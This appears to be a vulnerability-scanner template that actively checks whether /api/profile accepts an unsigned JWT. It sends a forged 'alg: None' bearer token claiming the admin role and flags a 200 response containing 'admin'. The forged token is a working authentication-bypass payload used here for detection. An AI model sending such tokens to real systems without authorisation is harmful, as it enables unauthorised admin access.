id: jwt2-50
name: 'JWT None kid key-149'
severity: critical
type: active
tags:
  - jwt
  - auth
  - none
description: 'Unsigned token accepted on /api/profile'
requests:
  - method: GET
    path: '{{BaseURL}}/api/profile'
    match-all: true
    sendHeaders:
      Authorization: 'Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIiwia2lkIjoia2V5LTE0OSJ9.eyJzdWIiOiJ1NDkiLCJyb2xlIjoiYWRtaW4ifQ.'
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - 'admin'
